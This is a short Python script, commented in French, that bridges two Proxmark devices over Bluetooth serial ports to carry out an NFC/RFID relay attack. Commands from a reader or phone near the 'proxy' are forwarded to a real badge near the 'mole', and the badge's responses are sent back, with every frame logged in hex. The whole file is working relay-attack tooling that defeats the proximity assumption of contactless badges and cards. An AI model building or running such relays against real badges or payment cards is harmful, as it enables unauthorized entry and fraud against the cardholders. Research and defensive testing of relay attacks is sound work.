import serial
import time
from smartcard.util import toHexString

# Configuration des ports Bluetooth (RFCOMM ou COM Bluetooth)
PORT_MOLE = 'COM12'   # Proxmark coté Tag
PORT_PROXY = 'COM13'  # Proxmark coté Lecteur (Tél)
BAUD_RATE = 115200

def pd(data):
    """Extraction de la valeur entière des octets"""
    return list(data)

def bridge_read(ser_source, label):
    """Lit une trame selon le protocole de Mendoza : [LEN][DATA]"""
    raw_init = ser_source.read(1)
    if not raw_init:
        return None
    
    buffer_len = pd(raw_init)[0]
    data = ser_source.read(buffer_len)
    print(f"[{label}] Recu ({buffer_len} bytes): {toHexString(pd(data))}")
    return data

try:
    print(f"[*] Connexion Bluetooth... Mole:{PORT_MOLE} | Proxy:{PORT_PROXY}")
    ser_mole = serial.Serial(PORT_MOLE, BAUD_RATE, timeout=5)
    ser_proxy = serial.Serial(PORT_PROXY, BAUD_RATE, timeout=5)

    print("[*] Attente du signal initial (Ping/UID)...")

    while True:
        #Attente d'une commande venant du Proxy (Lecteur -> Proxy)
        # Le reader interroge le Proxy
        cmd_reader = bridge_read(ser_proxy, "LECTEUR")
        
        if cmd_reader:
            #Transmission immédiate au Mole (Proxy -> Mole -> Tag)
            # On envoie la commande brute au Mole
            ser_mole.write(cmd_reader)
            
            # Réception de la réponse du vrai Tag via le Mole
            # Le Mole renvoie [LEN][DATA] après avoir interrogé le badge
            ans_tag = bridge_read(ser_mole, "TAG")
            
            if ans_tag:
                #Transmission de la réponse au Proxy (Mole -> Proxy -> Lecteur)
                ser_proxy.write(ans_tag)
                print("[+] Cycle de relai terminé avec succès.")
            else:
                print("[!] Pas de réponse du Tag (Mole timeout).")
        
        time.sleep(0.01) #pause pour laisser le CPU souffler

except KeyboardInterrupt:
    print("\n[!] Relais interrompu.")
finally:
    if 'ser_mole' in locals(): ser_mole.close()
    if 'ser_proxy' in locals(): ser_proxy.close()